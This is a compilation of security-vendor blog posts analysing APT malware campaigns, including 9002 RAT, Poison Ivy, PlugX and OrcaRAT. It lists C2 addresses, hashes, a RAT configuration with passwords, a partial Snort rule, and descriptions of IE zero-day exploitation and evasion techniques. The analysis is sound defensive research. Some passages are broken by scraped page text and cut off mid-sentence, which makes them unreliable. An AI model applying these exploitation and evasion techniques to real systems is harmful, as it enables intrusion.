Threat Actor Attribution Conclusion While these attackers have a demonstrated previously unknown zero - day exploits and a robust set of malware payloads , using the techniques described above , it is still possible for network defense professionals to develop a rich set of indicators that can be used to detect their attacks .
This is the first part of our analysis , we will provide more detailed analysis on the other components of this attack in subsequent blog post .
This entry was posted in Advanced Malware , Exploits , Targeted Attack , Threat Intelligence , Threat Research by Ned Moran and Nart Villeneuve .
Bookmark the permalink .
Recently , we discovered a new IE zero - day exploit in the wild , which has been used in a strategic Web compromise .
Specifically , the attackers inserted this zero - day exploit into a strategically important website , known to draw visitors that are likely interested in national and international security policy .
We have identified relationships between the infrastructure used in this attack and that used in Operation DeputyDog .
Furthermore , the attackers loaded the payload used in this attack directly into memory without first writing to disk – a technique not typically used by advanced persistent threat ( APT ) actors .
This technique will further complicate network defenders ' ability to triage compromised systems , using traditional forensics methods .
Enter Trojan . APT.9002 On November 8 , 2013 our colleagues Xiaobo Chen and Dan Caselden posted about a new Internet Explorer 0-day exploit seen in the wild .
This exploit was seen used in a strategic Web compromise .
The exploit chain was limited to one website .
There were no iframes or redirects to external sites to pull down the shellcode payload .
Through the FireEye Dynamic Threat Intelligence ( DTI ) cloud , we were able to retrieve the payload dropped in the attack .
This payload has been identified as a variant of Trojan . APT.9002 ( aka Hydraq / McRAT variant ) and runs in memory only .
It does not write itself to disk , leaving little to no artifacts that can be used to identify infected endpoints .
Specifically , the payload is shellcode , which is decoded and directly injected into memory after successful exploitation via a series of steps .
After an initial XOR decoding of the payload with the key '' 0x9F '' , an instance of rundll32.exe is launched and injected with the payload using CreateProcessA , OpenProcess , VirtualAlloc , WriteProcessMemory , and CreateRemoteThread .
Figure 1 – Initial XOR decoding of shellcode , with key ' 0x9F ' Figure 2 – Shellcode launches rundll32.exe and injects payload After transfer of control to the injected payload in rundll32.exe , the shellcode is then subjected to two more levels of XOR decoding with the keys ' 0×01′ , followed by ' 0x6A ' .
Figure 3- Decoding shellcode with XOR key ' 0×01′ Figure 4 – Decoding shellcode with XOR key ' 0x6A ' Process execution is then transferred to the final decoded payload , which is a variant of the 9002 RAT .
Figure 5 – Transfer of process execution to final decoded payload The fact that the attackers used a non - persistent first stage payload suggests that they are confident in both their resources and skills .
As the payload was not persistent , the attackers had to work quickly , in order to gain control of victims and move laterally within affected organizations .
If the attacker did not immediately seize control of infected endpoints , they risked losing these compromised endpoints , as the endpoints could have been rebooted at any time – thus automatically wiping the in - memory Trojan . APT.9002 malware variant from the infected endpoint .
Alternatively , the use of this non - persistent first stage may suggest that the attackers were confident that their intended targets would simply revisit the compromised website and be re - infected .
This Trojan . APT.9002 variant connected to a command and control server at 111.68.9.93 over port 443 .
It uses a non - HTTP protocol as well as an HTTP POST for communicating with the remote server .
However , the callback beacons have changed in this version , in comparison to the older 9002 RATs .
The older traditional version of 9002 RAT had a static 4-byte identifier at offset 0 in the callback network traffic .
This identifier was typically the string `` 9002″ , but we have also seen variants , where this has been modified – such as the 9002 variant documented in the Sunshop campaign .
Figure 6 – Traditional 9002 RAT callback beacon In contrast , the beacon from the diskless 9002 payload used in the current IE 0-day attack is remarkably different and uses a dynamic 4-byte XOR key to encrypt the data .
This 4-byte key is present at offset 0 and changes with each subsequent beacon .
Figure 7 – Sample callback beacons of the diskless 9002 RAT payload Figure 8 – XOR decrypted callback beacons of the diskless 9002 RAT payload The XOR decoded data always contains the static value `` \x09\x12\x11\x20″ at offset 16 .
This value is in fact hardcoded in packet data construction function prior to XOR encoding .
This value most likely is the date `` 2011 - 12 - 09″ but its significance is not known at this time .
Figure 9 – Packet data construction function showing hardcoded value The diskless 9002 RAT payload also makes a POST request , which has also changed from the traditional version .
It has Base64 stub data , instead of the static string `` AA '' .
The User - Agent string and URI pattern remain the same however .
It uses the static string `` lynx '' in the User - Agent string and the URI is incremental hexadecimal values .
The data in the POST stub is also encrypted with a 4-byte XOR key , and when decrypted , the data is similar to the data in the non - HTTP beacon and also has the static value `` \x09\x12\x11\x20″ .
We previously observed 104130d666ab3f640255140007f0b12d connecting to the same 111.68.9.93 IP address .
Analysis of MD5 104130d666ab3f640255140007f0b12d revealed that it shared unique identifying characteristics with 90a37e54c53ffb78969644b1a7038e8c , acbc249061a6a2fb09271a68d53567d9 , and 20854f54b0d03118681410245be39bd8 .
This variant connected to a command and control server at ad04.bounceme.net .
Passive DNS analysis of this domain revealed that it resolved to 58.64.213.104 between 2011 - 09 - 23 and 2011 - 10 - 21 .
The following other domains have also been seen resolving to this same IP address : If the domain dll.freshdns.org rings a bell , it should .
While covering a different Internet Explorer Zero - day ( CVE-2013 - 3893 ) and the associated Operation DeputyDog campaign , we reported that the CnC infrastructure used in that campaign overlapped with this same domain : dll.freshdns.org .
Inside the in - memory version of the Trojan . APT.9002 payload used in this strategic Web compromise , we identified the following interesting string : `` rat_UnInstall '' .
Through DTI , we found this same string present in a number of different samples including the ones discussed above : 104130d666ab3f640255140007f0b12d 90a37e54c53ffb78969644b1a7038e8c acbc249061a6a2fb09271a68d53567d9 20854f54b0d03118681410245be39bd8 Based on this analysis , all of these samples , including the in - memory variant , can be detected with the following simple YARA signature : We also found the following strings of interest present in these above 9002 RAT samples ( excluding the in - memory variant ) : McpRoXy.exe SoundMax.dll These strings were all observed and highlighted by Bit9 here .
As Bit9 notes in their blog , Trojan . APT.9002 ( aka Hydraq / McRAT ) was also used in the original Operation Aurora campaign , and the `` rat_UnInstall '' string can be found in the original Aurora samples confirming the lineage .
By utilizing strategic Web compromises along with in - memory payload delivery tactics and multiple nested methods of obfuscation , this campaign has proven to be exceptionally accomplished and elusive .
With uncanny timing and a penchant for consistently employing Zero - day exploits in targeted attacks , we expect APT threat actors to continue to evolve and launch new campaigns for the foreseeable future .
Not surprisingly , these old dogs continue to learn new tricks .
This entry was posted in Exploits , Targeted Attack , Threat Intelligence , Threat Research , Vulnerabilities by Ned Moran , Sai Omkar Vashisht , Mike Scott and Thoufique Haq .
Bookmark the permalink .
Get a Demo Customer Support Contact Us ALL POSTS FIREEYE HOME Blog August 23 , 2013 | By Nart Villeneuve , Ned Moran and Thoufique Haq | Threat Intelligence , Threat Research Search Blog Do n't be too hasty to link every Poison Ivy-­based cyber attack to China .
The popular remote access tool ( RAT ) , which we recently detailed on this blog , is being used in a broad campaign of attacks launched from the Middle East , too .
Filter by Category First , some background : Select Category In October 2012 , malware attacks against Israeli government targets grabbed media attention as officials temporarily cut off Internet access for its entire police force and banned the use of USB memory sticks .
Security researchers Resources subsequently linked these attacks to a broader , yearlong campaign that targeted not just Israelis but Palestinians as Definitive Guide to well .
Further research revealed a connection Next-­Generation Threat between these attacks and members of the so-­called '' Gaza Hackers Team .
But the group has also used Poison Ivy ( PIVY ) , a RAT more commonly associated with threat actors in China - so much so that PIVY has , inaccurately , become synonymous with all Download APT attacks linked to China .
Protecting Your Data , This blog post analyzes several recent Molerats attacks that deployed PIVY against targets in the Middle East and Intellectual Property , in the U.S. We also examine additional PIVY attacks that leverage Arabic-­language content related to the ongoing and Brand from Cyber crisis in Egypt and the wider Middle East to lure targets into opening malicious files .
Attacks Guide for CIOs , CFOs , and Enter Poison Ivy CISOs on why traditional security defenses are failing We observed several attacks in June and July 2013 against targets in the Middle East and the U.S. that dropped a and how losing the security PIVY payload that connected to command-­and-­control ( CnC ) infrastructure used by the Molerats attackers .
Subscribe YouTube View more videos » Facebook The malware sample we analyzed was unusual for two reasons : It referenced an article that was published last year The compile time for the dropped binary was also dated from last year , seemingly consistent with the referenced article .
But this malware was signed , and - in contrast to the compile time , which can be faked - the signing time on its certificate was much more recent : Monday , July 08 , 2013 1:45:10 A.M .
Here are the file details : Hamas shoot down Israeli F-16 fighter jet by modern weapon in Gaza sea.doc- – - – - – - – - – - -.scr MD5 : 7084f3a2d63a16a191b7fcb2b19f0e0d This malware was signed with a forged Microsoft certificate similar to previous XtremeRat samples .
But the serial number ( which is often reused by attackers , enabling FireEye researchers to link individual attacks , including those by the Molerats ) is different this time .
The malware dropped an instance of PIVY with the following configuration : ID : F16 08 - 07 - 2013 Group : DNS / Port : Direct : toornt.servegame.com:443 , Proxy DNS / Port : Proxy Hijack : No ActiveX Startup Key : HKLM Startup Entry : File Name : Install Path : C : \Documents and Settings\Admin\Local Settings\Temp\morse.exe Keylog Path : C : \Documents and Settings\Admin\Local Settings\Temp\morse Inject : No Process Mutex : gdfgdfgdg Key Logger Mutex : ActiveX Startup : No HKLM Startup : No Copy To : No Melt : No Persistence : No Keylogger : No Password : ! @ # GooD # @ ! We collected additional PIVY samples that had the same password or linked to CnC infrastructure at a common IP address ( or both ) .
We observed three PIVY passwords ( another potential identifier ) used in the attacks : '' ! @ # GooD # @ ! `` , '' ! @ # Goood # @ ! '' and '' admin100 '' .
Additional Samples with Middle Eastern Themes We also found a PIVY sample used by this group that leveraged what are known as key files instead of passwords .
The PIVY builder allows operators to load .pik
By default , PIVY secures these communications with the ascii text password of '' admin '' - when the same non-­default password appears in multiple attacks , researchers can conclude that the attacks are related .
The PIVY sample in question had an MD5 hash of 9dff139bbbe476770294fb86f4e156ac and communicated with a CnC server at toornt.servegame.com over port 443 .
The key file used to secure communications contained the following ascii string ' Password ( 256 bits ) : \x0d\x0aA9612889F6 ' ( where \x0d\x0a represents a line break ) .
The 9dff139bbbe476770294fb86f4e156ac sample dropped a decoy document in Arabic that included a transcript of an interview with Salam Fayyad , the former Prime Minister of the Palestinian National Authority .
The sample 16346b95e6deef9da7fe796c31b9dec4 was also seen communicating with toornt.servegame.com over port 443 .
This sample appears to have been delivered to its targets via a link to a RAR archive labeled Ramadan.rar ( fc554a0ad7cf9d4f47ec4f297dbde375 ) hosted at the Dropbox file-­sharing website .
The sample a8714aac274a18f1724d9702d40030bf dropped a decoy document in Arabic that contained a biography of General Adbel Fattah el-­Sisi – the Commander-­in-­Chief of the Egyptian Armed Forces .
A recent sample ( d9a7c4a100cfefef995785f707be895c ) used protests in Egypt to entice recipients to open a malicious file .
Another sample ( b0a9abc76a2b4335074a13939c59bfc9 ) contained a decoy with a grim picture of Fadel Al Radfani , who was the adviser to the defense minister of Yemen before he was assassinated .
Although we are seeing Egyptian-­ and Middle Eastern-­themed attacks using decoy content in Arabic , we can not determine the intended targets of all of these attacks .
Delivery Vector We believe that the Molerats attacker uses spear phishing to deliver weaponized RAR files containing their malicious payloads to their victims in at least two different ways .
The Molerats actor will in some cases attach the weaponized RAR file directly to their spear-­ phishing-­emails .
We also believe that this actor sends spear-­phishing emails that include links to RAR files hosted on third-­party platforms such as Dropbox .
In one such example we found the following link was used to host Ramadan.rar ( fc554a0ad7cf9d4f47ec4f297dbde375 ) : hxxps : //dl [ .
The CnC servers for this cluster of activity are : toornt.servegame.com updateo.servegame.com egypttv.sytes.net skype.servemp3.com natco2.no-­ip.net Two of the domain names ( natco2.no-­ip.net and skype.servemp3.com ) that were used as CnCs for PIVY were both documented as XtremeRat CnCs that were used in previous attacks .
We focused on these domains and their IP addresses - which they had in common with toornt.servegame.com .
In addition , we added the well-­known CnCs good.zapto.org and hint.zapto.org used in previously documented attacks .
By observing changes in DNS resolution that occurred within the same timeframe , we were able to ensure that the passive DNS data we collected was the same .
Interestingly , we also found that the domains often shifted to a new IP address over time .
One interesting discovery concerns a sample ( 5b740b4623b2d1049c0036a6aae684b0 ) that was first seen by VirusTotal on September 14 , 2012 .
This date is within the timeframe of the original XtremeRat attacks , but the payload in this case was PIVY .
This indicates that the attackers have been using PIVY in addition to XtremeRat for longer than we had originally believed .
Conclusion We do not know whether using PIVY is an attempt by those behind the Molerats campaign to frame China-­based threat actors for their attacks or simply evidence that they have added another effective , publicly-­available RAT to its arsenal .
But this development should raise a warning flag for anyone tempted to automatically attribute all PIVY attacks to threat actors based in China .
The ubiquity of off-­the-­shelf RATs makes determining those responsible an increasing challenge .
The ongoing attacks are also heavily leveraging content in Arabic that uses conflicts in Egypt and the wider Middle East to lure targets into opening malicious files .
But we have no further information about the exact targets of these Arabic lures .
As events on the ground in the Middle East - and in Egypt in particular - receive international attention , we expect the Molerat operators to continue leveraging these headlines to catalyze their operations .
Yara Signature This Yara signature can be used to locate signed samples that have the new certificate serial numbers used by Molerats .
Samples 9dff139bbbe476770294fb86f4e156ac 6350d1039742b87b7917a5e26de2c25c b0a9abc76a2b4335074a13939c59bfc9 5b740b4623b2d1049c0036a6aae684b0 9dff139bbbe476770294fb86f4e156ac cf31aea415e7013e85d1687a1c0f5daa 973b5f2a5608d243e7305ee4f9249302 e85fc76362c2e9dc7329fddda8acc89e b05603938a888018d4dcdc551c4be8ac 7084f3a2d63a16a191b7fcb2b19f0e0d 16346b95e6deef9da7fe796c31b9dec4 a8714aac274a18f1724d9702d40030bf d9a7c4a100cfefef995785f707be895c 9ef9a631160b96322010a5238defc673 a60873e364a01870b2010518d05a62df This entry was posted in Threat Intelligence , Threat Research by Nart Villeneuve , Ned Moran and Thoufique Haq .
Bookmark the permalink .
Introduction Our worldwide sensor network provides researchers at FireEye Labs with unique opportunities to detect innovative tactics employed by malicious actors and protects our clients from these tactics .
We recently uncovered a coordinated campaign targeting Internet infrastructure providers , a media organization , a financial services company , and an Asian government organization .
The actor responsible for this campaign utilized legitimate digital certificates to sign their tools and employed innovative techniques to cloak their command and control traffic .
Hurricane Electric Redirection In March of 2014 , we detected Kaba ( aka PlugX or SOGU ) callback traffic to legitimate domains and IP addresses .
Our initial conclusion was that this traffic was the result of malicious actors ' sleeping ' their implants , by pointing their command and control domains at legitimate IP addresses .
As this is a popular technique , we did not think much of this traffic at the time .
Further analysis revealed that the HTTP headers of the traffic in question contained a Host : entry for legitimate domains .
As we have previously observed malware families that forge their HTTP headers to include legitimate domains in callback traffic , we concluded that the malware in this case was configured in the same way .
An example of the observed traffic is as follows : POST /C542BB084F927229348B2A34 HTTP/1.1 Accept : * / * CG100 : 0 CG103 : 0 CG107 : 61456 CG108 : 1 User - Agent : Mozilla/4.0 ( compatible ; MSIE 9.0 ; Windows NT 6.1 ; SLCC2 ; .NET
Via this research , we found a malware sample that we believe was responsible for at least some of the strange traffic that we had observed .
The identified sample had the following properties : MD5 : 52d2d1ab9b84303a585fb81e927b9e01 Size : 180296 Compile Time : 2013 - 10 - 15 05:17:37 Import Hash : b29eb78c7ec3f0e89bdd79e3f027c029 .rdata
This certificate has a serial number of ' 06 55 69 a3 e2 61 40 91 28 a4 0a ff a9 0d 6d 10 ' .
Analysis of this Kaba sample revealed that it was configured to directly connect to both www.adobe.com and update.adobe.com .
Obviously , this configuration does not make a lot of sense , as the actor would not be able to control their implants from anywhere on the Internet since they did not have direct control over these domains – unless the attackers were able to re - route traffic destined for these domains from specific victims .
Indeed , further analysis of this Kaba variant revealed that it was also configured to use specific DNS resolvers .
This sample was configured to resolve DNS lookups via Hurricane Electric 's nameservers of 216.218.130.2 , 216.218.131.2 , 216.218.132.2 and 216.66.1.2 .
We found this interesting , so we investigated how these Hurricane Electric 's nameservers were configured .
Subsequently , we found that anyone could register for a free account with Hurricane Electric 's hosted DNS service .
Via this service , anyone with an account was able to register a zone and create A records for the registered zone and point those A records to any IP address they so desired .
The dangerous aspect of this service is that anyone was able to hijack legitimate domains such as adobe.com .
Although these nameservers are not recursors and were not designed to be queried directly by end users , they were returning results if queried directly for domains that were configured via Hurricane Electrics public DNS service .
Furthermore , Hurricane Electric did not check if zones created by their users were already been registered or are otherwise legitimately owned by other parties .
As we continued this research , we identified 21 legitimate fully qualified domain names that had been hijacked via this technique by at least one APT actor .
In addition to the adobe.com domain mentioned above , another one of the poisoned domains is www.outlook.com .
A lookup of this domain via Google 's DNS resolvers returns expected results : A quick lookup of these addresses reveal that Microsoft owns them : However , as recently as August 4 , 2014 a lookup of the same www.outlook.com domain via Hurricane Electric 's resolvers returned entirely different results [ 1 ] : Passive DNS research on the 59.125.42.167 IP address revealed that multiple APT actors have previously used this IP address .
Additional researched uncovered more Kaba samples that were configured to leverage Hurricane Electric 's public DNS resolvers .
Another sample has the following properties : This sample is signed with a recently expired digital certificate from ' MOCOMSYS INC ' .
This certificate has a serial number of ' 03 e5 a0 10 b0 5c 92 87 f8 23 c2 58 5f 54 7b 80 ' .
This sample used Hurricane Electric 's public DNS resolvers to route traffic to the hijacked domains of www.adobe.com and update.adobe.com .
We also noted that this sample was configured to connect directly to 59.125.42.168 – one IP address away from the IP that received traffic from the hijacked www.outlook.com domain .
Passive DNS research revealed that this IP hosted the same set of known APT domains listed above : While this problem does not directly impact users of www.adobe.com , www.outlook.com , or users of the other affected domains , it should not be dismissed as inconsequential .
Actors that adopt this tactic and obfuscate the destination of their traffic through localized DNS hijacks can significantly complicate the job of network defenders .
Via our sensor network , we observed the actor responsible for this activity conducting a focused campaign .
We observed this actor target : Google Code Command and Control Furthermore , we also discovered this same actor conducting a parallel campaign that leveraged Google Code for command and control .
On August 1 , 2014 we observed a malicious self - extracting executable ( aka sfxrar ) file downloaded from 211.125.81.203 .
This file had the following properties : A valid certificate from ' QTI INTERNATIONAL INC ' was used to sign this sfxrar .
This certificate had a serial number of ' 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 ' .
The sfxrar contained the following files : Setup.exe is a legitimate executable from Kaspersky used to load the Kaba ( aka PlugX ) files – msi.dll and msi.dll.dat .
These Kaba files are configured to connect to Google Code – specifically code.google.com/p/udom/ .
On August 1 , this Google Code project contained the encoded command '' DZKSGAAALLBACDCDCDOCBDCDCDOCCDADIDOCBDADDZJS '' .
On August 1 , this Google Code project contained the encoded command '' DZKSGAAALLBACDCDCDOCBDCDCDOCCDADIDOCBDADDZJS '' .
The command ' DZKSGAAALLBACDCDCDOCBDCDCDOCCDADIDOCBDADDZJS ' decodes to 222.122.208.10 .
In a live environment , the Kaba implant would then connect to this IP address via UDP .
Further analysis of project at code.google.com/p/udom/ revealed the project owner , 0x916ftb691u , created a number of other projects .
We decoded the commands hosted at these linked projects and found that they issued the following decoded commands : It is likely that other yet to be discovered Kaba variants are configured to connect to these related Google Code projects and then redirect to this list of IP addresses .
Passive DNS analysis of these IP addresses revealed connections to the following known malicious infrastructure : Relationships Between Campaigns As mentioned above the Kaba variant eae0391e92a913e757ac78b14a6f079f shared a common import hash of f749528b1db6fe5aee61970813c7bc18 with many of the samples listed in this post .
This samples was to use Hurricane Electric 's nameservers as well as connect directly to the IP address 59.125.42.168 .
Note that we identified the same C2 IP 59.125.42.168 via our analysis of the malicious Google Code projects .
Specifically , the Google Project at code.google.com/p/tempzz/ , which is linked to the project at code.google.com/p/udom/ , issued an encoded command that decoded to 59.125.42.168 .
We also identified another related Kaba variant that connected to code.google.com/p/updata-server .
This variant had the following properties : This sample was signed with a valid digital certificate from ' PIXELPLUS CO . , LTD ' and had a serial number of ' 0f e7 df 6c 4b 9a 33 b8 3d 04 e2 3e 98 a7 7c ce ' .
In addition to sharing the same Import hash of f749528b1db6fe5aee61970813c7bc18 seen in other samples listed throughout this post , 50af349c69ae4dec74bc41c581b82459 contained a RT_VERSION resource of 9dd9b7c184069135c23560f8fbaa829adc7af6d2047cf5742b5a1e7c5c923cb9 .
This same RT_VERSION was used in a number of other related samples including : Conclusion These coordinated campaigns demonstrate that APT actors are determined to continue operations .
As computer network defenders increase their capabilities to identify and block these campaigns by deploying more advanced detection technologies , threat actors will continue to adopt creative evasion techniques .
We observed the following evasion techniques in these campaigns : While none of these techniques are necessarily new , in combination , they are certainly both creative and have been observed to be effective .
Although the resultant C2 traffic can be successfully detected and tracked , the fact that the malware appears to beacon to legitimate domains may lull defenders into a false sense of security .
Network defenders should continue to study the evolution of advanced threat actors , as these adversaries will continue to evolve in pursuit of their designated objectives .
This entry was posted in Targeted Attack , Threat Research and tagged advanced attack , APT , evasion techniques , kana , plugx by Ned Moran , Joshua Homan and Mike Scott .
Bookmark the permalink .
The vulnerability affects IE6 through IE11 , but the attack is targeting IE9 through IE11 .
This zero - day bypasses both ASLR and DEP .
Microsoft has assigned CVE-2014 - 1776 to the vulnerability and released security advisory to track this issue .
Threat actors are actively using this exploit in an ongoing campaign which we have named `` Operation Clandestine Fox .
But we believe this is a significant zero day as the vulnerable versions represent about a quarter of the total browser market .
We recommend applying a patch once available .
According to NetMarket Share , the market share for the targeted versions of IE in 2013 were : IE 9 13.9 % IE 10 11.04 % IE 11 1.32 % Collectively , in 2013 , the vulnerable versions of IE accounted for 26.25 % of the browser market .
The vulnerability , however , does appear in IE6 through IE11 though the exploit targets IE9 and higher .
The exploit leverages a previously unknown use - after - free vulnerability , and uses a well - known Flash exploitation technique to achieve arbitrary memory access and bypass Windows ' ASLR and DEP protections .
The exploit page loads a Flash SWF file to manipulate the heap layout with the common technique heap feng shui .
It allocates Flash vector objects to spray memory and cover address 0×18184000 .
Next , it allocates a vector object that contains a flash . Media . Sound ( ) object , which it later corrupts to pivot control to its ROP chain .
The SWF file calls back to Javascript in IE to trigger the IE bug and overwrite the length field of a Flash vector object in the heapspray .
The SWF file loops through the heapspray to find the corrupted vector object , and uses it to again modify the length of another vector object .
This other corrupted vector object is then used for subsequent memory accesses , which it then uses to bypass ASLR and DEP .
With full memory control , the exploit will search for ZwProtectVirtualMemory , and a stack pivot ( opcode 0×94 0xc3 ) from NTDLL .
It also searches for SetThreadContext in kernel32 , which is used to clear the debug registers .
This technique , documented here , may be an attempt to bypass protections that use hardware breakpoints , such as EMET 's EAF mitigation .
With the addresses of the aforementioned APIs and gadget , the SWF file constructs a ROP chain , and prepends it to its RC4 decrypted shellcode .
It then replaces the vftable of a sound object with a fake one that points to the newly created ROP payload .
When the sound object attempts to call into its vftable , it instead pivots control to the attacker 's ROP chain .
The ROP payload basically tries to make memory at 0×18184000 executable , and to return to 0x1818411c to execute the shellcode .
Inside the shellcode , it saves the current stack pointer to 0×18181800 to safely return to the caller .
Then , it restores the flash . Media . Sound vftable and repairs the corrupted vector object to avoid application crashes .
The shellcode also recovers the ESP register to make sure the stack range is in the current thread stack base / limit .
The shellcode calls SetThreadContext to clear the debug registers .
It is possible that this is an attempt to bypass mitigations that use the debug registers .
The shellcode calls URLDownloadToCacheFileA to download the next stage of the payload , disguised as an image .
Using EMET may break the exploit in your environment and prevent it from successfully controlling your computer .
Enhanced Protected Mode in IE breaks the exploit in our tests .
Additionally , the attack will not work without Adobe Flash .
Disabling the Flash plugin within IE will prevent the exploit from functioning .
The APT group responsible for this exploit has been the first group to have access to a select number of browser - based 0-day exploits ( e.g .
They are extremely proficient at lateral movement and are difficult to track , as they typically do not reuse command and control infrastructure .
They have a number of backdoors including one known as Pirpi that we previously discussed here .
As this is still an active investigation we are not releasing further indicators about the exploit at this time .
Acknowledgement : We thank Christopher Glyer , Matt Fowler , Josh Homan , Ned Moran , Nart Villeneuve and Yichong Lin for their support , research , and analysis on these findings .
This entry was posted in Advanced Malware , Exploits , Targeted Attack , Uncategorized and tagged zero- day by Xiaobo Chen , Dan Caselden and Mike Scott .
Bookmark the permalink .
By Dan Kelly and Tom Lancaster It 's every malware analyst 's dream to be handed a sample which is , so far , unnamed by the AV community - especially when the malware in question may have links to a well - known APT group .
In my line of work I analyse several ' unknown ' malware samples a week , but often it turns out that they are simply new variants of existing malware families .
Recently I was fortunate enough to be handed something that not only had a low detection rate but , aside from heuristics , seemed to be relatively unknown to the top 40 anti - virus companies .
In this post I will walk you through the malware family we ' ve dubbed `` OrcaRAT '' .
First of all , it is worth pointing out that most of the malware I see on a day - to - day basis is espionage orientated , and very rarely do the programmers and operators make much effort to cover their tracks .
The use of forged HTTP headers is a common occurrence and simple mistakes within these headers are frequent .
The malware in question was handed to me by one of our threat intelligence analysts who was hunting through infrastructure associated with some samples of Comfoo [ 1 ] malware and happened across a malware sample ( 253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613 ) he did n't recognise .
He immediately took the malware and passed it through first stage analysis , which involves running the file in a sandbox environment .
After this , he handed it over for more in - depth capability analysis .
The structure I began by looking over the sandbox report .
The first thing that drew my attention was the URI structure .
To understand this structure more , we must reverse engineer the functions that generate and then encode the data .
Firstly we begin by analysing the routines that produce the data which is later encoded and sent in the HTTP URI field .
The very first thing that jumped out when disassembling the malware is the simplicity and cleanliness of the code .
There are also a significant number of Windows Crypto API [ 2 ] functions imported by the malware , so we can assume this indicates that it uses encryption .
In one such example the final product was `` \x61\xBA\xF4\x44\x52\xF1OrcaKiller '' ( where \x denotes hexadecimal values ) .
Once this value has been produced , the malware begins constructing the URI .
With many pieces of malware the initial communications that it sends out to its command and control server ( known as beaconing or phoning home ) usually include pieces of information about the victim system .
The randomly generated values noted above are actually used to encrypt several pieces of information that are extracted from the system , and even the key itself is included .
The RC4 encryption key is derived from an MD5 hash [ 4 ] of the randomly generated bytes concatenated with the ' OrcaKiller ' string .
Once the data has been encrypted it is base64 encoded .
Any forward slashes in the base64 string are replaced with a tilde - pseudo code is shown below .
Once all of the values have been encrypted and formatted the URI has the following structure : ( A screenshot showing the URI structure of OrcaRAT command and control activity ) The campaign ID value is constructed using a method similar to that for the encryption key .
This now gives us OrcaKiller and wHaLe .
It would appear that our adversary has a salty sense of humour .
Command and control As with all malware , the command and control functions reveal the true nature and intent of the operators .
Up until now we have only determined how the malware communicates with the server .
We will now investigate the mechanisms that the server uses to communicate and interact with the victim .
The command and control routine in OrcaRAT appears to serve two purposes .
Interestingly these routines are split in to two branches .
Each branch of command and control activity is determined by the unique response from the remote server .
Command and control takes form of a webpage .
Unlike malware designed by the well - known Comment Crew [ 5 ] , this group does not hide these commands in HTML comments , but instead places them in plain view .
The first set of commands force the malware to behave as a simple downloader .
The first set are < P > and the terminating tag < /P > .
Once the malware has found these tags it drops in to the first command and control function .
The malware then extracts the payload text between the HTML tags and runs it through a decryption routine .
The same encryption key that is sent in the URI string is used to decrypt the text .
Once the payload text has been decrypted the malware treats this as a binary executable file , which is then written to the disk and executed .
The second set of HTML tags allows the operator to drop the malware in to a set of remote control functions .
This time the malware searches for the < H1 > tag that is terminated by < /H1 > .
Once the payload text between these tags has been extracted it is then decrypted using the encryption key found in the URI string .
The payload text from this page is much smaller and ultimately points to the command function that the operator has executed .
After a command and control message is received , OrcaRAT sends an HTTP POST message back to the command and control server .
Each time that the URI is built it generates a new encryption key , showing that the command and control server is at least serving dynamic content .
Given the command structure above , it is logical to assume that the command and control server requires an operator to manually issue specific commands to the victim workstation , with the default command likely being ' sleep ' .
Given the information above we can reasonably assume that this malware was most likely designed as a first stage implant .
History has shown that malware designed in this way is usually done so to allow the operator an initial level of access to the compromised system , usually for surveying the victim and then deciding whether to deploy a more capable and valuable second stage malware implant .
Detection Once OrcaRAT has been delivered to a victim system there are a number of ways to detect it .
Firstly we will cover disk detection using Yara .
The rule below will detect an OrcaRAT binary executable that has been written to a compromised machine 's disk .
Detecting malware at different stages of connectivity can be important .
By creating signatures with a nexus to the kill chain [ 6 ] we can determine which stage the intrusion has reached .
The two signatures below will indicate whether the intrusion has reached the command and control or action - on phases .
Snort : alert tcp any any - > any any ( msg : '' : : [ PwC CTD ] : : - OrcaRAT implant check - in '' ; flow : established , from_client ; urilen : 67 < > 170 ; content : '' User - Agent : Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET
In mid - July of this year , we noticed yet another legitimate website had been compromised by APT actors and was serving malware .
In this case , it was a group commonly referred to as `` Nitro , '' which was coined by Symantec in its 2011 whitepaper .
As we dug deeper , we found additional compromised legitimate websites and malware from the same group back through March of this year .
In most instances , the malware is one commonly referred to as '' Spindest , '' though we also found `` PCClient '' and `` Farfli '' variants in use by the group .
We do n't have enough data to say for certain that all of the malware in this blog was delivered via compromised legitimate websites .
Historically , Nitro is known for targeted spear phishing campaigns and using Poison Ivy malware , which was not seen in these attacks .
Since at least 2013 , Nitro appears to have somewhat modified their malware and delivery methods to include Spindest and legitimate compromised websites , as reported by Cyber Squared 's TCIRT .
Our findings indicate they are continuing to evolve with the addition of PCClient and Farfli variants .
The Maltego screenshot below shows the activity we describe in this blog .
These events impacted at least the following industries , across four waves : A US based IT Solutions provider ; The European office of a major , US based commercial vendor of space imagery and geospatial content ; A European leader in power technologies and automation for utilities and industry ; A US based provider of medical and dental imaging systems and IT solutions .
In July , Nitro compromised a South Korean clothing and accessories manufacturer 's website to serve malware commonly referred to as `` Spindest .
This IP address has been in use by this group for some time , which is interesting since they have evolved other components of their kill chain over time to ensure malware delivery , but oddly not altered their C2 infrastructure .
It is simple for companies to block any outbound traffic to this IP , which would negate the effort Nitro put into successfully delivering the malware .
In addition , the following three samples were found roughly a week apart from each other , possibly indicating the timing of the waves of activity .
Table 1 The next sample we found is commonly known as PCClient , which is not malware previously tied to this group .
We discovered this , and many of the following samples , through historic IP resolution overlap between the same domains alternately resolving to either the 223.25.233.248 or 196.45.144.12 .
The second IP has also not been reported as tied to this group before .
However , this shifting of IP resolutions back and forth indicates Nitro is in control of these domains .
It also makes is fairly easy for any Infosec team to reach the same conclusion we did , which again negates their use both of a previously unreported domain and IP for C2 , as well as a new family of malware .
Its PE timestamp was 8 July , almost a week prior when we first saw it .
Table 2 The next sample was another Spindest variant and had the same timestamp as the aforementioned PcClient sample .
In addition , Nitro chose to use the same C2 for this sample , making it easy to both find and tie to the group .
Table 3 The next wave of activity we found took place in mid - May .
Both samples were Spindest variants with the same PE timestamp of 15 May .
While neither MD5s for C2 match , the aforementioned link to a post by Cyber Squared 's TCIRT did document Nitro using Spindest variants with the same file name starting late December last year .
In that case they used the historic C2 IP we note in Table 1 in this blog .
Table 4 Table 5 The malware dropped was configured to use good.myftp [ .
Both of these are known Nitro Indicators of Compromise ( IOCs ) .
In this case , the malware was a Farfli variant , again not a malware previously tied to this group .
The PE timestamp on the file was 1 April , about two weeks before we saw the file .
